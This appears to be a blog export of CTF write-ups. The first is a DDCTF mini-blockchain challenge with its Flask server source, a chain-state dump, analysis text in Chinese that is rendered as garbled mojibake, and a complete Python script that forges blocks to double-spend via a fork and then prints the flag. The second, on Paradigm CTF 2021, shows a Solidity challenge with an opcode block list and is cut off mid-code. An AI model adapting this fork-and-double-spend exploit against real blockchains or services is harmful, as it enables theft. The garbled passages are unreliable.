[{"id":"ab8ce4952a43550ec79920bab8adbb0a","title":"Preliminary Exploration of Public Chain Security","content":"0x01 challenge\n\ndocker run -it -p 5000:5000 chainflag&#x2F;mini_blockchain\n&#x2F;&#x2F;è¿è¡Œé¢˜ç›®\n\n0x02 source codeServe.py# -*- encoding: utf-8 -*-\n# written in python 2.7\n__author__ = 'garzon'\n\nimport hashlib, json, rsa, uuid, os\nfrom flask import Flask, session, redirect, url_for, escape, request\n\napp = Flask(__name__)\napp.secret_key = '*********************'\nurl_prefix = '/b9ca5f959dd7e'\n\ndef FLAG():\n    return 'Here is your flag: DDCTF&#123;******************&#125;'\n\ndef hash(x):\n    return hashlib.sha256(hashlib.md5(x).digest()).hexdigest()\n    \ndef hash_reducer(x, y):\n    return hash(hash(x)+hash(y))\n    \ndef has_attrs(d, attrs):\n    if type(d) != type(&#123;&#125;): raise Exception(\"Input should be a dict/JSON\")\n    for attr in attrs:\n        if attr not in d:\n            raise Exception(\"&#123;&#125; should be presented in the input\".format(attr))\n\nEMPTY_HASH = '0'*64\n\ndef addr_to_pubkey(address):\n    return rsa.PublicKey(int(address, 16), 65537)\n    \ndef pubkey_to_address(pubkey):\n    assert pubkey.e == 65537\n    hexed = hex(pubkey.n)\n    if hexed.endswith('L'): hexed = hexed[:-1]\n    if hexed.startswith('0x'): hexed = hexed[2:]\n    return hexed\n    \ndef gen_addr_key_pair():\n    pubkey, privkey = rsa.newkeys(384)\n    return pubkey_to_address(pubkey), privkey\n\nbank_address, bank_privkey = gen_addr_key_pair()\nhacker_address, hacker_privkey = gen_addr_key_pair()\nshop_address, shop_privkey = gen_addr_key_pair()\nshop_wallet_address, shop_wallet_privkey = gen_addr_key_pair()\n\ndef sign_input_utxo(input_utxo_id, privkey):\n    return rsa.sign(input_utxo_id, privkey, 'SHA-1').encode('hex')\n    \ndef hash_utxo(utxo):\n    return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])\n    \ndef create_output_utxo(addr_to, amount):\n    utxo = &#123;'id': str(uuid.uuid4()), 'addr': addr_to, 'amount': amount&#125;\n    utxo['hash'] = hash_utxo(utxo)\n    return utxo\n    \ndef hash_tx(tx):\n    return reduce(hash_reducer, [\n        reduce(hash_reducer, tx['input'], EMPTY_HASH),\n        reduce(hash_reducer, [utxo['hash'] for utxo in tx['output']], EMPTY_HASH)\n    ])\n    \ndef create_tx(input_utxo_ids, output_utxo, privkey_from=None):\n    tx = &#123;'input': input_utxo_ids, 'signature': [sign_input_utxo(id, privkey_from) for id in input_utxo_ids], 'output': output_utxo&#125;\n    tx['hash'] = hash_tx(tx)\n    return tx\n    \ndef hash_block(block):\n    return reduce(hash_reducer, [block['prev'], block['nonce'], reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])\n    \ndef create_block(prev_block_hash, nonce_str, transactions):\n    if type(prev_block_hash) != type(''): raise Exception('prev_block_hash should be hex-encoded hash value')\n    nonce = str(nonce_str)\n    if len(nonce) > 128: raise Exception('the nonce is too long')\n    block = &#123;'prev': prev_block_hash, 'nonce': nonce, 'transactions': transactions&#125;\n    block['hash'] = hash_block(block)\n    return block\n    \ndef find_blockchain_tail():\n    return max(session['blocks'].values(), key=lambda block: block['height'])\n    \ndef calculate_utxo(blockchain_tail):\n    curr_block = blockchain_tail\n    blockchain = [curr_block]\n    while curr_block['hash'] != session['genesis_block_hash']:\n        curr_block = session['blocks'][curr_block['prev']]\n        blockchain.append(curr_block)\n    blockchain = blockchain[::-1]\n    utxos = &#123;&#125;\n    for block in blockchain:\n        for tx in block['transactions']:\n            for input_utxo_id in tx['input']:\n                del utxos[input_utxo_id]\n            for utxo in tx['output']:\n                utxos[utxo['id']] = utxo\n    return utxos\n        \ndef calculate_balance(utxos):\n    balance = &#123;bank_address: 0, hacker_address: 0, shop_address: 0&#125;\n    for utxo in utxos.values():\n        if utxo['addr'] not in balance:\n            balance[utxo['addr']] = 0\n        balance[utxo['addr']] += utxo['amount']\n    return balance\n\ndef verify_utxo_signature(address, utxo_id, signature):\n    try:\n        return rsa.verify(utxo_id, signature.decode('hex'), addr_to_pubkey(address))\n    except:\n        return False\n\ndef append_block(block, difficulty=int('f'*64, 16)):\n    has_attrs(block, ['prev', 'nonce', 'transactions'])\n    \n    if type(block['prev']) == type(u''): block['prev'] = str(block['prev'])\n    if type(block['nonce']) == type(u''): block['nonce'] = str(block['nonce'])\n    if block['prev'] not in session['blocks']: raise Exception(\"unknown parent block\")\n    tail = session['blocks'][block['prev']]\n    utxos = calculate_utxo(tail)\n    \n    if type(block['transactions']) != type([]): raise Exception('Please put a transaction array in the block')\n    new_utxo_ids = set()\n    for tx in block['transactions']:\n        has_attrs(tx, ['input', 'output', 'signature'])\n        \n        for utxo in tx['output']:\n            has_attrs(utxo, ['amount', 'addr', 'id'])\n            if type(utxo['id']) == type(u''): utxo['id'] = str(utxo['id'])\n            if type(utxo['addr']) == type(u''): utxo['addr'] = str(utxo['addr'])\n            if type(utxo['id']) != type(''): raise Exception(\"unknown type of id of output utxo\")\n            if utxo['id'] in new_utxo_ids: raise Exception(\"output utxo of same id(&#123;&#125;) already exists.\".format(utxo['id']))\n            new_utxo_ids.add(utxo['id'])\n            if type(utxo['amount']) != type(1): raise Exception(\"unknown type of amount of output utxo\")\n            if utxo['amount'] &lt;= 0: raise Exception(\"invalid amount of output utxo\")\n            if type(utxo['addr']) != type(''): raise Exception(\"unknown type of address of output utxo\")\n            try:\n                addr_to_pubkey(utxo['addr'])\n            except:\n                raise Exception(\"invalid type of address(&#123;&#125;)\".format(utxo['addr']))\n            utxo['hash'] = hash_utxo(utxo)\n        tot_output = sum([utxo['amount'] for utxo in tx['output']])\n        \n        if type(tx['input']) != type([]): raise Exception(\"type of input utxo ids in tx should be array\")\n        if type(tx['signature']) != type([]): raise Exception(\"type of input utxo signatures in tx should be array\")\n        if len(tx['input']) != len(tx['signature']): raise Exception(\"lengths of arrays of ids and signatures of input utxos should be the same\")\n        tot_input = 0\n        tx['input'] = [str(i) if type(i) == type(u'') else i for i in tx['input']]\n        tx['signature'] = [str(i) if type(i) == type(u'') else i for i in tx['signature']]\n        for utxo_id, signature in zip(tx['input'], tx['signature']):\n            if type(utxo_id) != type(''): raise Exception(\"unknown type of id of input utxo\")\n            if utxo_id not in utxos: raise Exception(\"invalid id of input utxo. Input utxo(&#123;&#125;) does not exist or it has been consumed.\".format(utxo_id))\n            utxo = utxos[utxo_id]\n            if type(signature) != type(''): raise Exception(\"unknown type of signature of input utxo\")\n            if not verify_utxo_signature(utxo['addr'], utxo_id, signature):\n                raise Exception(\"Signature of input utxo is not valid. You are not the owner of this input utxo(&#123;&#125;)!\".format(utxo_id))\n            tot_input += utxo['amount']\n            del utxos[utxo_id]\n        if tot_output > tot_input:\n            raise Exception(\"You don't have enough amount of DDCoins in the input utxo! &#123;&#125;/&#123;&#125;\".format(tot_input, tot_output))\n        tx['hash'] = hash_tx(tx)\n    \n    block = create_block(block['prev'], block['nonce'], block['transactions'])\n    block_hash = int(block['hash'], 16)\n    if block_hash > difficulty: raise Exception('Please provide a valid Proof-of-Work')\n    block['height'] = tail['height']+1\n    if len(session['blocks']) > 50: raise Exception('The blockchain is too long. Use ./reset to reset the blockchain')\n    if block['hash'] in session['blocks']: raise Exception('A same block is already in the blockchain')\n    session['blocks'][block['hash']] = block\n    session.modified = True\n    \ndef init():\n    if 'blocks' not in session:\n        session['blocks'] = &#123;&#125;\n        session['your_diamonds'] = 0\n    \n        # First, the bank issued some DDCoins ...\n        total_currency_issued = create_output_utxo(bank_address, 1000000)\n        genesis_transaction = create_tx([], [total_currency_issued]) # create DDCoins from nothing\n        genesis_block = create_block(EMPTY_HASH, 'The Times 03/Jan/2009 Chancellor on brink of second bailout for bank', [genesis_transaction])\n        session['genesis_block_hash'] = genesis_block['hash']\n        genesis_block['height'] = 0\n        session['blocks'][genesis_block['hash']] = genesis_block\n        \n        # Then, the bank was hacked by the hacker ...\n        handout = create_output_utxo(hacker_address, 999999)\n        reserved = create_output_utxo(bank_address, 1)\n        transferred = create_tx([total_currency_issued['id']], [handout, reserved], bank_privkey)\n        second_block = create_block(genesis_block['hash'], 'HAHA, I AM THE BANK NOW!', [transferred])\n        append_block(second_block)\n        \n        # Can you buy 2 diamonds using all DDCoins?\n        third_block = create_block(second_block['hash'], 'a empty block', [])\n        append_block(third_block)\n        \ndef get_balance_of_all():\n    init()\n    tail = find_blockchain_tail()\n    utxos = calculate_utxo(tail)\n    return calculate_balance(utxos), utxos, tail\n    \n@app.route(url_prefix+'/')\ndef homepage():\n    announcement = 'Announcement: The server has been restarted at 21:45 04/17. All blockchain have been reset. '\n    balance, utxos, _ = get_balance_of_all()\n    genesis_block_info = 'hash of genesis block: ' + session['genesis_block_hash']\n    addr_info = 'the bank\\'s addr: ' + bank_address + ', the hacker\\'s addr: ' + hacker_address + ', the shop\\'s addr: ' + shop_address\n    balance_info = 'Balance of all addresses: ' + json.dumps(balance)\n    utxo_info = 'All utxos: ' + json.dumps(utxos)\n    blockchain_info = 'Blockchain Explorer: ' + json.dumps(session['blocks'])\n    view_source_code_link = \"&lt;a href='source_code'>View source code&lt;/a>\"\n    return announcement+('&lt;br />&lt;br />\\r\\n\\r\\n'.join([view_source_code_link, genesis_block_info, addr_info, balance_info, utxo_info, blockchain_info]))\n    \n    \n@app.route(url_prefix+'/flag')\ndef getFlag():\n    init()\n    if session['your_diamonds'] >= 2: return FLAG()\n    return 'To get the flag, you should buy 2 diamonds from the shop. You have &#123;&#125; diamonds now. To buy a diamond, transfer 1000000 DDCoins to '.format(session['your_diamonds']) + shop_address\n    \ndef find_enough_utxos(utxos, addr_from, amount):\n    collected = []\n    for utxo in utxos.values():\n        if utxo['addr'] == addr_from:\n            amount -= utxo['amount']\n            collected.append(utxo['id'])\n        if amount &lt;= 0: return collected, -amount\n    raise Exception('no enough DDCoins in ' + addr_from)\n    \ndef transfer(utxos, addr_from, addr_to, amount, privkey):\n    input_utxo_ids, the_change = find_enough_utxos(utxos, addr_from, amount)\n    outputs = [create_output_utxo(addr_to, amount)]\n    if the_change != 0:\n        outputs.append(create_output_utxo(addr_from, the_change))\n    return create_tx(input_utxo_ids, outputs, privkey)\n    \n@app.route(url_prefix+'/5ecr3t_free_D1diCoin_b@ckD00r/&lt;string:address>')\ndef free_ddcoin(address):\n    balance, utxos, tail = get_balance_of_all()\n    if balance[bank_address] == 0: return 'The bank has no money now.'\n    try:\n        address = str(address)\n        addr_to_pubkey(address) # to check if it is a valid address\n        transferred = transfer(utxos, bank_address, address, balance[bank_address], bank_privkey)\n        new_block = create_block(tail['hash'], 'b@cKd00R tr1993ReD', [transferred])\n        append_block(new_block)\n        return str(balance[bank_address]) + ' DDCoins are successfully sent to ' + address\n    except Exception,e:\n        return 'ERROR: ' + str(e)\n\nDIFFICULTY = int('00000' + 'f' * 59, 16)\n@app.route(url_prefix+'/create_transaction', methods=['POST'])\ndef create_tx_and_check_shop_balance():\n    init()\n    try:\n        block = json.loads(request.data)\n        append_block(block, DIFFICULTY)\n        msg = 'transaction finished.'\n    except Exception, e:\n        return str(e)\n        \n    balance, utxos, tail = get_balance_of_all()\n    if balance[shop_address] == 1000000:\n        # when 1000000 DDCoins are received, the shop will give you a diamond\n        session['your_diamonds'] += 1\n        # and immediately the shop will store the money somewhere safe.\n        transferred = transfer(utxos, shop_address, shop_wallet_address, balance[shop_address], shop_privkey)\n        new_block = create_block(tail['hash'], 'save the DDCoins in a cold wallet', [transferred])\n        append_block(new_block)\n        msg += ' You receive a diamond.'\n    return msg\n    \n        \n# if you mess up the blockchain, use this to reset the blockchain.\n@app.route(url_prefix+'/reset')\ndef reset_blockchain():\n    if 'blocks' in session: del session['blocks']\n    if 'genesis_block_hash' in session: del session['genesis_block_hash']\n    return 'reset.'\n    \n@app.route(url_prefix+'/source_code')\ndef show_source_code():\n    source = open('serve.py', 'r')\n    html = ''\n    for line in source:\n        html += line.replace('&amp;','&amp;amp;').replace('\\t', '&amp;nbsp;'*4).replace(' ','&amp;nbsp;').replace('&lt;', '&amp;lt;').replace('>','&amp;gt;').replace('\\n', '&lt;br />')\n    source.close()\n    return html\n    \nif __name__ == '__main__':\n    app.run(debug=False, host='0.0.0.0')\n\nBlock.jsonAnnouncement: The server has been restarted at 21: 45 04/17. All blockchain have been reset. View source code\n\nhash of genesis block: be640671a52952b2131db45c57d47546981ff5f147be0bbd635a3ddc84223875\n\nthe bank's addr: 82f4388efc72da6dc0b3f2de97f71b08f75d884c84a13fe65c4e8fab520c9f28ca88541f96180a0740490ac4785091a1,\nthe hacker's addr: abf5835cbc5365bbcca88fd5b42d206da37819e55c9a8f82483b691b81994c9013d9d5972cd7a65a0a96bcf6f070858b, \nthe shop's addr: 89bd78fab0d0340fa22af91cd104a07d4725f8b0296e49abe939fed47b12940b5f2c1a70e22a5a8d38c119916b8cd545\n\nBalance of all addresses: &#123;\n    \"89bd78fab0d0340fa22af91cd104a07d4725f8b0296e49abe939fed47b12940b5f2c1a70e22a5a8d38c119916b8cd545\": 0,\n    \"abf5835cbc5365bbcca88fd5b42d206da37819e55c9a8f82483b691b81994c9013d9d5972cd7a65a0a96bcf6f070858b\": 999999,\n    \"82f4388efc72da6dc0b3f2de97f71b08f75d884c84a13fe65c4e8fab520c9f28ca88541f96180a0740490ac4785091a1\": 1\n&#125;\n\nAll utxos: &#123;\n    \"0ff9dfa0-a54a-4178-bfec-08ffe5b8b563\": &#123;\n        \"amount\": 1,\n        \"hash\": \"7214dfcf889839edcc6f62a45a5dc7f6facee8d07770076a47066cfa31284e56\",\n        \"addr\": \"82f4388efc72da6dc0b3f2de97f71b08f75d884c84a13fe65c4e8fab520c9f28ca88541f96180a0740490ac4785091a1\",\n        \"id\": \"0ff9dfa0-a54a-4178-bfec-08ffe5b8b563\"\n    &#125;,\n    \"7637e88e-f204-4218-a06f-e9d7bac7c83f\": &#123;\n        \"amount\": 999999,\n        \"hash\": \"812d25d4353dbd4fe577f95bd0e2b9c025e869fda429bafaef29e905ab057b21\",\n        \"addr\": \"abf5835cbc5365bbcca88fd5b42d206da37819e55c9a8f82483b691b81994c9013d9d5972cd7a65a0a96bcf6f070858b\",\n        \"id\": \"7637e88e-f204-4218-a06f-e9d7bac7c83f\"\n    &#125;\n&#125;\n\nBlockchain Explorer: &#123;\n    \"5b6c21275843991fc5ecd900c147a5f1a593d0ee5aebda4739ecca8866bcf990\": &#123;\n        \"nonce\": \"a empty block\",\n        \"prev\": \"126122810f9b8807bec1d52f999ca960117eeb4ddc02d8299ba914840bc39e7b\",\n        \"hash\": \"5b6c21275843991fc5ecd900c147a5f1a593d0ee5aebda4739ecca8866bcf990\",\n        \"transactions\": [],\n        \"height\": 2\n    &#125;,\n    \"126122810f9b8807bec1d52f999ca960117eeb4ddc02d8299ba914840bc39e7b\": &#123;\n        \"nonce\": \"HAHA, I AM THE BANK NOW!\",\n        \"prev\": \"be640671a52952b2131db45c57d47546981ff5f147be0bbd635a3ddc84223875\",\n        \"hash\": \"126122810f9b8807bec1d52f999ca960117eeb4ddc02d8299ba914840bc39e7b\",\n        \"transactions\": [\n            &#123;\n                \"input\": [\n                    \"c9dd4f71-a9dc-4e78-b32c-2800ec131fcd\"\n                ],\n                \"signature\": [\n                    \"1d16f161e44e4b38cef33f67da0bb9a22f72033304150051d4c31b0d6dc23a0ae698da5ebca3df26e555bb0d2a9ba0ef\"\n                ],\n                \"hash\": \"5079bfd8fa1742a45d08f0be78ca9d79fd4785418c9e66e7857d62d451779a69\",\n                \"output\": [\n                    &#123;\n                        \"amount\": 999999,\n                        \"hash\": \"812d25d4353dbd4fe577f95bd0e2b9c025e869fda429bafaef29e905ab057b21\",\n                        \"addr\": \"abf5835cbc5365bbcca88fd5b42d206da37819e55c9a8f82483b691b81994c9013d9d5972cd7a65a0a96bcf6f070858b\",\n                        \"id\": \"7637e88e-f204-4218-a06f-e9d7bac7c83f\"\n                    &#125;,\n                    &#123;\n                        \"amount\": 1,\n                        \"hash\": \"7214dfcf889839edcc6f62a45a5dc7f6facee8d07770076a47066cfa31284e56\",\n                        \"addr\": \"82f4388efc72da6dc0b3f2de97f71b08f75d884c84a13fe65c4e8fab520c9f28ca88541f96180a0740490ac4785091a1\",\n                        \"id\": \"0ff9dfa0-a54a-4178-bfec-08ffe5b8b563\"\n                    &#125;\n                ]\n            &#125;\n        ],\n        \"height\": 1\n    &#125;,\n    \"be640671a52952b2131db45c57d47546981ff5f147be0bbd635a3ddc84223875\": &#123;\n        \"nonce\": \"The Times 03/Jan/2009 Chancellor on brink of second bailout for bank\",\n        \"prev\": \"0000000000000000000000000000000000000000000000000000000000000000\",\n        \"hash\": \"be640671a52952b2131db45c57d47546981ff5f147be0bbd635a3ddc84223875\",\n        \"transactions\": [\n            &#123;\n                \"input\": [],\n                \"signature\": [],\n                \"hash\": \"7cfc30daec2db89d15fa54cea31d2e4c8dc6338b9f48744d49fc6dd98470ddaa\",\n                \"output\": [\n                    &#123;\n                        \"amount\": 1000000,\n                        \"hash\": \"0533f20dcd461947c6491b460e3b21d9bd7ad7a9a9202e28b66085b71c6fe64c\",\n                        \"addr\": \"82f4388efc72da6dc0b3f2de97f71b08f75d884c84a13fe65c4e8fab520c9f28ca88541f96180a0740490ac4785091a1\",\n                        \"id\": \"c9dd4f71-a9dc-4e78-b32c-2800ec131fcd\"\n                    &#125;\n                ]\n            &#125;\n        ],\n        \"height\": 0\n    &#125;\n&#125;\n\n0x03 analyseåˆæŽ¢å…¬é“¾å®‰å…¨ï¼Œè¿™é“é¢˜å¸¦æ¥çš„æ„Ÿè§‰è¿˜æ˜¯å¾ˆæœ‰éš¾åº¦çš„\né¦–å…ˆæ¥åˆ†æžä¸€ä¸‹serve.pyçš„æºç ï¼Œå¯ä»¥æž„é€ å‡ºå¦‚ä¸‹çš„ä¸€ä¸ªåŒºå—é“¾ç»“æž„\né¢˜ç›®è¦æ±‚äº†èŽ·å¾—ä¸¤é¢—é’»çŸ³ï¼Œ100wä¸€é¢—ï¼Œä½†æ˜¯æ€»å…±å‘è¡Œäº†100w DDCoinå¹¶ä¸”è¿˜æœ‰99wè¢«é»‘å®¢è½¬èµ°ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦éœ€è¦é€šè¿‡åŒèŠ±æ¥å®žçŽ°tokenå¤šæ¬¡èŠ±è´¹ï¼Œè´­ä¹°ä¸¤ä¸ªé’»çŸ³ï¼Œè¿™ä¹Ÿå°±æ¶‰åŠåˆ°51%æ”»å‡»\n51%æ”»å‡»ï¼Œåœ¨åŒºå—é“¾ç³»ç»Ÿä¹‹ä¸‹ï¼ŒçŸ¿å·¥åªè®¤å®šæœ€é•¿çš„é‚£ä¸€æ¡åŒºå—é“¾ï¼Œæ‰€ä»¥å¦‚æžœæœ‰ä¸€åæ¶æ„çŸ¿å·¥ï¼Œæ‹¥æœ‰å…¨ç½‘ä¸€åŠä»¥ä¸Šçš„ç®—åŠ›ï¼Œé‚£ä¹ˆä»–å°±æœ‰æ›´å¤§çš„æ¦‚çŽ‡è®¡ç®—å‡ºä¸‹ä¸€ä¸ªåŒºå—ï¼Œè¿›è€Œæž„é€ å‡ºæ›´é•¿çš„ä¸€æ¡åŒºå—é“¾ï¼Œå›žæ»šä¸Šä¸€æ¡åŒºå—çš„äº¤æ˜“ï¼Œå®žçŽ°è´§å¸çš„äºŒæ¬¡èŠ±è´¹\n\nå¦‚ä¸Šå›¾ï¼Œé»‘å®¢è¿›è¡Œäº†èŠ±è´¹ä¹‹åŽï¼Œåˆ†å‰å‡ºä¸€ä¸ªæ–°çš„åŒºå—ï¼Œå¹¶ä¸”å¿«é€Ÿè®¡ç®—å‡ºä¸‹ä¸€ä¸ªåŒºå—ï¼Œæž„å»ºæˆä¸€ä¸ªæ›´é•¿çš„åŒºå—é“¾ï¼Œåˆ™èŠ±è´¹åŒºå—ä½œåºŸï¼Œä½™é¢å›žæ»šè‡³èŠ±è´¹ä¹‹å‰ã€‚\nè¿™é“é¢˜å·²ç»è¯´äº†ï¼Œå…¨éƒ¨çŸ¿æœºå·²ç»å®•æœºï¼Œæ‰€ä»¥æˆ‘ä»¬æ‹¥æœ‰100%çš„ç®—åŠ›ï¼Œè¿›è¡Œä¸¤æ¬¡åˆ†å‰å³å¯è´­ä¹°ä¸¤é¢—é’»çŸ³\næ‰€ä»¥æˆ‘ä»¬å¦‚ä¸‹å›¾æž„é€ \n\næ¸…æ¥šäº†æ€Žä¹ˆåˆ©ç”¨51æ”»å‡»ï¼Œå†æ¬¡å®¡è®¡ä½¿ç”¨pythonå®žçŽ°çš„blockchainï¼Œç»™å‡ºäº†append_blockå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åƒæŒ‡å®šåŒºå—åŽæ·»åŠ ä¸‹ä¸€ä¸ªåŒºå—ï¼Œæ‰€ä»¥åªéœ€è¦æž„å»ºæˆ‘ä»¬çš„æ”»å‡»åŒºå—ï¼Œå®žçŽ°æ›´é•¿çš„åŒºå—é“¾å³å¯ï¼ˆæ¯æ¬¡åœ¨å‰ç«¯é¡µé¢åˆ›å»ºæ–°çš„äº¤æ˜“ä¼šå¢žåŠ åŒºå—ï¼ŒåŒæ—¶åˆ¤æ–­shopæ—¶å€™èŽ·å¾—100w ddcoinsåŒæ—¶åœ¨ä¸‹ä¸€ä¸ªåŒºå—è½¬èµ°è¿™ç¬”é’±ï¼‰\nAttackfrom functools import reduce\nimport hashlib, json, rsa, uuid, os\nfrom flask import Flask, session, redirect, url_for, escape, request\nimport requests\nimport uuid\n\nEMPTY_HASH = '0' * 64\nDIFFICULTY = int('00000' + 'f' * 59, 16)\n\nurl = \"http://127.0.0.1:9999/b9ca5f959dd7e/\"\nr = requests.get(url=url)\nsession1 = r.headers['Set-Cookie'].split(\";\")[0][8:]\ncookies = &#123;\"session\": session1&#125;\nreq = requests.get(url, cookies=cookies)\nprint(req.text)\n\ngenesis_block=input(\"genesis block:\")\nshop_addr=input(\"shop address:\")\nINPUT=input(\"INPUT ID:\")\nSIGNATURE=input(\"sigature:\")\n\ndef hash(x):\n    return hashlib.sha256(hashlib.md5(x.encode()).digest()).hexdigest()\n \ndef hash_reducer(x, y):\n    return hash(hash(x) + hash(y))\n \ndef hash_block(block):\n    return reduce(hash_reducer, [block['prev'], block['nonce'], reduce(hash_reducer, [tx['hash'] for tx in block['transactions']], EMPTY_HASH)])\n \ndef hash_utxo(utxo):\n    return reduce(hash_reducer, [utxo['id'], utxo['addr'], str(utxo['amount'])])\n\ndef hash_tx(tx):\n    return reduce(hash_reducer, [\n        reduce(hash_reducer, tx['input'], EMPTY_HASH),\n        reduce(hash_reducer, [utxo['hash']\n                              for utxo in tx['output']], EMPTY_HASH)\n    ])\n\ndef pubkey_to_address(pubkey):\n    assert pubkey.e == 65537\n    hexed = hex(pubkey.n)\n    if hexed.endswith('L'): hexed = hexed[:-1]\n    if hexed.startswith('0x'): hexed = hexed[2:]\n    return hexed\n    \ndef gen_addr_key_pair():\n    pubkey, privkey = rsa.newkeys(384)\n    return pubkey_to_address(pubkey), pubkey,privkey\n\ndef pow_work(block, difficulty, msg=\"\"):\n    nonce = 0\n    while nonce &lt; 2**32:\n        block['nonce'] = msg + str(nonce)\n        block['hash'] = hash_block(block)\n        block_hash = int(block['hash'], 16)\n        if block_hash &lt; difficulty:\n            return block\n        nonce += 1\n\ndef emptyBlock(prevHash, msg):\n    block = &#123;&#125;\n    block['prev'] = prevHash\n    block['transactions'] = []\n    return pow_work(block, DIFFICULTY, msg)\n\ndef fmt_block(block):\n    return json.dumps(block)\n\ndef fill_transaction():\n    utxo = &#123;'id': str(uuid.uuid4()), 'addr': shop_addr, 'amount': 1000000&#125;\n    utxo['hash'] = hash_utxo(utxo)\n    tx = &#123;'input': [INPUT], 'signature': [SIGNATURE], 'output': [utxo]&#125;\n    tx['hash'] = hash_tx(tx)\n    return [tx]\n\ndef headers(session):\n    headers = &#123;\n        \"Host\": \"127.0.0.1:9999\",\n        \"Upgrade-Insecure-Requests\": \"1\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36\",\n        \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\",\n        \"Accept-Language\": \"zh-CN,zh;q=0.8\",\n        \"Cookie\": \"session=&#123;&#125;\".format(session),\n        \"Connection\": \"close\",\n        \"Content-Type\": \"application/json\"\n    &#125;\n    return headers\n\nblock1 = &#123;&#125;\nblock1[\"prev\"] = genesis_block\nblock1[\"transactions\"] = fill_transaction()\nblock1 = pow_work(block1, DIFFICULTY)\nact1 = requests.post(\"http://127.0.0.1:9999/b9ca5f959dd7e/create_transaction\",data=fmt_block(block1), headers=headers(session1))\nprint(act1.content)\nprint(act1.headers)\n\nsession2 = act1.headers['Set-Cookie'].split(\";\")[0][8:]\nblock2 = emptyBlock(block1['hash'], \"empty2\")\nact2 = requests.post(\"http://127.0.0.1:9999/b9ca5f959dd7e/create_transaction\",data=fmt_block(block2), headers=headers(session2))\nprint(act2.content)\n\nsession3 = act2.headers['Set-Cookie'].split(\";\")[0][8:]\nblock3 = emptyBlock(block2['hash'], \"empty3\")\nact3 = requests.post(\"http://127.0.0.1:9999/b9ca5f959dd7e/create_transaction\",data=fmt_block(block3), headers=headers(session3))\nprint(act3.content)\n\nsession4 = act3.headers['Set-Cookie'].split(\";\")[0][8:]\nblock4 = emptyBlock(block3['hash'], \"empty4\")\nact4 = requests.post(\"http://127.0.0.1:9999/b9ca5f959dd7e/create_transaction\",data=fmt_block(block4), headers=headers(session4))\nprint(act4.content)\n\nsession5 = act4.headers['Set-Cookie'].split(\";\")[0][8:]\nblock5 = emptyBlock(block4['hash'], \"empty5\")\nact5 = requests.post(\"http://127.0.0.1:9999/b9ca5f959dd7e/create_transaction\",data=fmt_block(block5), headers=headers(session5))\nprint(act5.content)\n\nsession6 = act5.headers['Set-Cookie'].split(\";\")[0][8:]\nresult=requests.get(\"http://127.0.0.1:9999/b9ca5f959dd7e/flag\",headers=headers(session6))\nprint(result.content)\n\nè¿è¡Œç¨‹åº\nç…§ç€rep.textå¤©èŽå¯¹åº”çš„inputï¼ŒèŽ·å¾—è¿è¡Œç»“æžœ\n\nflagï¼šHere is your flag: DDCTF&#123;B10cKch@iN_15_FuN_e53ff95faed&#125;\n\n","slug":"mini_blockchian","date":"2022-12-01T11:52:01.667Z","categories_index":"","tags_index":"åŒºå—é“¾ ctf","author_index":"bcYng"},{"id":"e4a055270fc77b5d73f92a425173cb60","title":"Paradigm CTF 2021","content":"ç”±äºŽå›¢é˜Ÿçš„éœ€è¦ï¼Œéœ€è¦å¤çŽ°ä¸€ä¸‹Paradigm CTF 2021ã€‚\n\n\n1.ReverCodepragma solidity 0.8.0;\n\ncontract Deployer &#123;\n    constructor(bytes memory code) &#123; assembly &#123; return (add(code, 0x20), mload(code)) &#125; &#125;\n&#125;\n\ncontract Challenge &#123;\n    address public fwd;\n    address public rev;\n    \n    function safe(bytes memory code) private pure returns (bool) &#123;\n        uint i = 0;\n        while (i &lt; code.length) &#123;\n            uint8 op = uint8(code[i]);\n            if (\n                   op == 0x3B // EXTCODECOPY\n                || op == 0x3C // EXTCODESIZE\n                || op == 0x3F // EXTCODEHASH\n                || op == 0x54 // SLOAD\n                || op == 0x55 // SSTORE\n                || op == 0xF0 // CREATE\n                || op == 0xF1 // CALL\n                || op == 0xF2 // CALLCODE\n                || op == 0xF4 // DELEGATECALL\n                || op == 0xF5 // CREATE2\n                || op == 0xFA // STATICCALL\n                || op == 0xFF // SELFDESTRUCT\n            ) return false;\n            \n            if (op >= 0x60 &amp;&amp; op &lt; 0x80) i += (op - 0x60) + 1;\n            \n            i++;\n        &#125;\n        \n        return true;\n    &#125;\n    \n    function flip(bytes memory a) private pure returns (bytes memory) &#123;\n        bytes memory b = new bytes(a.length);\n        for (uint i = 0; i &lt; a.length; i++) &#123;\n            b[b.length - i - 1] = a[i];\n        &#125;\n        return b;\n    &#125;\n\n    function deployOne(bytes memory code) private returns (address) &#123;\n        require(code.length &lt; 101, \"deployOne/code-too-long\");\n        require(safe(code), \"deployOne/code-unsafe\");\n        \n        return address(new Deployer(code));\n    &#125;\n    \n    function deploy(bytes memory code) public  &#123;\n        fwd = deployOne(code);\n        rev = deployOne(flip(code));\n    &#125;\n&#125;\n\ncontract Setup &#123;\n    Challenge public challenge;\n    \n    constructor() &#123;\n        challenge = new Challenge();\n    &#125;\n    \n    function test(string memory what) public view returns (bool) &#123;\n        return test(challenge.fwd(), what) &amp;&amp; test(challenge.rev(), what);\n    &#125;\n    \n    function test(address who, string memory what) public view returns (bool) &#123;\n        bool ok;\n        assembly &#123;\n            ok := staticcall(gas(), who, add(what, 0x20), mload(what), 0x00, 0x00)\n            if ok &#123;\n                if iszero(iszero(returndatasize())) &#123;\n                    let ptr := mload(0x40)\n                    returndatacopy(ptr, 0x00, returndatasize())\n                    ok := mload(ptr)\n                &#125;\n            &#125;\n        &#125;\n        return ok;\n    